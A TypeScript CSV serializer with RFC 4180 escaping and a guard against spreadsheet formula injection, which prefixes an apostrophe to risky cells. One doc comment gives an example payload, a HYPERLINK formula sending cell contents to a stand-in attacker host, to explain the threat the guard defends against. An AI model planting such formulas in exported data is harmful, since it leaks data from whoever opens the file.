/**
 * Minimal CSV serializer — no external dependency, matching this project's
 * general preference for hand-rolled utilities over a library for something
 * this small (roadmap.md 8.10's own framing: avoid disproportionate effort).
 * Escapes a field only when it needs it (comma, quote, CR/LF), doubling any
 * embedded quotes per RFC 4180. CRLF line endings for broad spreadsheet
 * compatibility (Excel, Power BI, Looker Studio all expect them).
 */

export interface CsvColumn<T> {
  header: string;
  value: (row: T) => string | number | boolean | null | undefined;
}

/**
 * Anything a spreadsheet may read as the start of a formula rather than as
 * text. `+` and `-` are in there because `+1-1` and `-1+1` are formulas too;
 * the optional leading whitespace matters because the parser skips it before
 * deciding, and a bare leading tab or CR is itself a documented trigger.
 */
const FORMULA_START = /^(?:[\s]*[=+\-@]|[\t\r])/;

/**
 * CSV injection (CWE-1236): a cell is data to this API but a *formula* to
 * Excel, LibreOffice and Google Sheets, which evaluate it when the export is
 * opened. Incident titles, descriptions and tag names are typed by users, so
 * a member of one organization can plant
 * `=HYPERLINK("https://attacker/?d="&A1,"Ver")` in a title and have it fire
 * inside whatever machine opens the export — a different trust boundary from
 * this API's own, and one no amount of `orgId` scoping reaches. Quoting
 * (below) is not the fix either: the parser strips the quotes before it
 * decides the cell is a formula.
 *
 * Prefixing with an apostrophe is the standard neutralization — spreadsheets
 * read `'` as the "treat this cell as text" marker and don't display it, so
 * the exported value still reads correctly.
 */
function neutralizeFormula(raw: string): string {
  return FORMULA_START.test(raw) ? `'${raw}` : raw;
}

function escapeCsvField(raw: string): string {
  const safe = neutralizeFormula(raw);
  if (/[",\r\n]/.test(safe)) {
    return `"${safe.replace(/"/g, '""')}"`;
  }
  return safe;
}

// Leading UTF-8 BOM: Excel — the most likely destination for a downloaded
// CSV — mis-detects the encoding without it and mangles accented Spanish
// characters (incident titles, tag/project names).
const UTF8_BOM = '﻿';

export function toCsv<T>(rows: T[], columns: CsvColumn<T>[]): string {
  const header = columns.map((c) => escapeCsvField(c.header)).join(',');
  const lines = rows.map((row) =>
    columns.map((c) => escapeCsvField(String(c.value(row) ?? ''))).join(','),
  );
  return UTF8_BOM + [header, ...lines].join('\r\n') + '\r\n';
}
